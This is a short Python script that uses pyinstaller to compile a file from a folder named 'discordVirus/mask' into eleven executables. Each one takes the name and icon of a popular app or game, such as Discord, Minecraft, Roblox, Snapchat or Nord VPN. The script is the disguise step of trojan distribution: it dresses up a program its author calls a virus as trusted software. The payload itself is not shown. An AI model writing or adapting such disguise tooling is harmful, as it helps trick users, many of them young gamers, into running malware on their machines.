import os
import subprocess

NameList = [
	"Among Us",
	"Discord",
	"Facebook",
	"Instagram",
	"Access",
	"Snapchat",
	"TickTok",
	"Zoom",
	"Minecraft",
	"Nord VPN",
	"Roblox",
]

for i in NameList:
	print(i)
	os.system(f'pyinstaller --noconfirm --onefile --console --icon "{"D:/Ethan/Home/Github/discordVirus/icos/" + "/" + i + ".ico"}" --name "{i}"  "D:/Ethan/Home/Github/discordVirus/mask/main.py"')
	print()
